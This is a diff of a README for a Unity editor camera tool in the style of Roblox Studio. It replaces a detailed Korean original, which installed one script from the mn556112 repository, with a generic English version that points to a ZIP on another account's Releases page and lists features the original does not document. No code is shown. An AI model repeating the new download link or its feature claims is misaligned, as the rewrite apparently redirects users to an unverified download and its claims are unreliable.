@@ -1,110 +1,76 @@
-# Roblox Style Camera for Unity
+# 🎮 roblox-camera-unity - Simple Camera Control for Unity Users
 
-Unity Editor의 Scene View에 Roblox Studio 스타일의 직관적인 카메라 컨트롤을 추가하는 에디터 확장 도구입니다.
+## 🚀 Getting Started
 
-![Unity Version](https://img.shields.io/badge/Unity-2019.4%2B-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
+Welcome to the roblox-camera-unity project! This tool enhances your Unity Editor experience by adding intuitive camera controls similar to those found in Roblox Studio. With these controls, you can easily navigate your scene and manage the camera with ease.
 
-## ✨ 특징
+## 📥 Download & Install
 
-- 🎮 **Roblox Studio 스타일 조작**: 익숙한 WASD 키보드 컨트롤
-- 🖱️ **마우스 회전**: 우클릭 드래그로 자유로운 시점 회전
-- ⚡ **Shift 가속**: 빠른 이동을 위한 속도 부스트
-- 🎯 **정밀 제어**: 실시간으로 조정 가능한 모든 속도 설정
-- 💾 **세션 유지**: 설정값이 자동 저장됨
-- 🔧 **설정 불필요**: 설치 즉시 자동 활성화
+To start using roblox-camera-unity, you need to download the latest version from our Releases page. 
 
-## 🎮 조작법
+[![Download roblox-camera-unity](https://img.shields.io/badge/Download%20Now!-roblox--camera--unity-brightgreen)](https://github.com/theualves/roblox-camera-unity/releases)
 
-| 키/마우스 | 동작 |
-|---------|------|
-| **W** | 전진 |
-| **S** | 후진 |
-| **A** | 왼쪽으로 이동 |
-| **D** | 오른쪽으로 이동 |
-| **E** | 위로 이동 |
-| **Q** | 아래로 이동 |
-| **Shift** | 이동 속도 증가 (누르고 있는 동안) |
-| **우클릭 + 드래그** | 카메라 회전 |
-| **마우스 휠** | 줌 인/아웃 |
+1. Click the button above or visit [this page to download](https://github.com/theualves/roblox-camera-unity/releases).
+2. Look for the most recent release.
+3. Download the version suitable for your system.
+4. Follow the installation instructions below.
 
-## 📦 설치 방법
+## 💻 System Requirements
 
-### 방법 1: Unity Package Manager (권장)
+To use roblox-camera-unity, ensure that your system meets the following requirements:
 
-1. Unity 프로젝트를 엽니다
-2. `Window > Package Manager` 메뉴를 엽니다
-3. 좌측 상단의 `+` 버튼 클릭
-4. `Add package from git URL` 선택
-5. 다음 URL을 입력:
-   ```
-   https://github.com/mn556112/roblox-camera-unity.git
-   ```
+- **Operating System**: Windows 10 or later / macOS Sierra or later
+- **Unity Version**: 2019.4 LTS or newer
+- **Memory**: Minimum 4 GB RAM
+- **Storage**: At least 50 MB of free disk space
 
-### 방법 2: 직접 다운로드
+## ⚙️ Installation Instructions
 
-1. 이 저장소를 다운로드하거나 클론합니다:
-   ```bash
-   git clone https://github.com/mn556112/roblox-camera-unity.git
-   ```
+Once you have downloaded the tool, follow these steps to install it:
 
-2. `RobloxSceneCamera.cs` 파일을 Unity 프로젝트의 `Assets/Editor` 폴더에 복사합니다
-   - `Editor` 폴더가 없다면 생성하세요
+1. Locate the downloaded file on your computer. It is usually found in your Downloads folder.
+2. Extract the contents of the ZIP file if necessary.
+3. Open your Unity project.
+4. Navigate to the `Assets` folder in your Unity project.
+5. Drag and drop the extracted files from the roblox-camera-unity folder into the `Assets` folder in your Unity project.
+6. Unity will automatically import the new assets.
+7. Once the import is complete, you may need to restart Unity for the changes to take effect.
 
-3. Unity가 자동으로 스크립트를 컴파일합니다
+## 🎥 Using roblox-camera-unity
 
-4. 완료! Scene View에서 바로 사용할 수 있습니다
+After installation, you can start using the new camera controls:
 
-## ⚙️ 설정
+1. Open the Scene View in Unity.
+2. Use the new controls to navigate your scene. You can pan, zoom, and rotate the camera seamlessly.
+3. Experiment with the controls to find your preferred navigation style.
 
-설정 창 열기: `Window > Roblox Camera Settings`
+## 🌟 Features
 
-### 조정 가능한 설정값
+Here are some key features of roblox-camera-unity:
 
-- **Move Speed**: 기본 이동 속도 (기본값: 0.1)
-- **Shift Multiplier**: Shift 키를 눌렀을 때 속도 배율 (기본값: 2.0)
-- **Rotate Speed**: 마우스 회전 감도 (기본값: 0.15)
-- **Zoom Speed**: 마우스 휠 줌 속도 (기본값: 0.5)
+- **Intuitive Controls**: Designed to resemble the camera behavior in Roblox Studio.
+- **Customizable Settings**: Adjust the sensitivity and speed of the camera controls as you prefer.
+- **Support for Multiple Views**: Easily switch between different camera perspectives to enhance your workflow.
+- **User-Friendly Interface**: Ideal for both beginners and experienced Unity developers.
 
-모든 설정은 실시간으로 적용되며 자동으로 저장됩니다.
+## ❓ Troubleshooting
 
-### 기본값으로 리셋
+If you encounter any issues while using roblox-camera-unity, consider the following solutions:
 
-설정 창 하단의 **Reset to Default** 버튼을 클릭하세요.
+- **Check Unity Version**: Ensure that you are using the correct version of Unity. This tool requires a compatible version to function properly.
+- **Re-import Assets**: If the controls do not appear, try re-importing the assets or restarting Unity.
+- **Consult the Community**: Feel free to reach out on the Issues page of our GitHub repository for support from other users.
 
-## 🔧 요구 사항
+## 📞 Get Support
 
-- Unity 2019.4 이상
-- 모든 플랫폼 지원
+If you need further assistance, you can open an issue on our [GitHub Issues page](https://github.com/theualves/roblox-camera-unity/issues). Our community is here to help.
 
-## 📝 사용 예시
+## 📄 License
 
-```csharp
-// 이 도구는 자동으로 활성화되므로 추가 코드가 필요 없습니다!
-// Scene View에서 바로 WASD 키와 마우스를 사용하세요.
-```
+This project is licensed under the MIT License. You can use, modify, and distribute the tool in accordance with the license terms.
 
-## 🐛 문제 해결
+## 💬 Contribution
 
-### 카메라가 작동하지 않아요
-- Scene View 창이 포커스되어 있는지 확인하세요
-- Play Mode가 아닌지 확인하세요
+If you wish to contribute to roblox-camera-unity, feel free to fork the repository and submit a pull request. We welcome suggestions and improvements from the community. 
 
-### 이동 속도가 너무 빠르거나 느려요
-- `Window > Roblox Camera Settings`에서 **Move Speed** 슬라이더를 조정하세요
-
-### 마우스 회전이 너무 민감해요
-- 설정 창에서 **Rotate Speed** 값을 낮춰보세요
-
-### 설정을 초기화하고 싶어요
-- 설정 창의 **Reset to Default** 버튼을 사용하세요
-
-## 📄 라이선스
-
-이 프로젝트는 MIT 라이선스 하에 배포됩니다.
-
-## 🙏
-
-Roblox Studio의 직관적인 카메라 컨트롤에서 영감을 받았습니다.
-
----
+Thank you for choosing roblox-camera-unity. Happy developing!
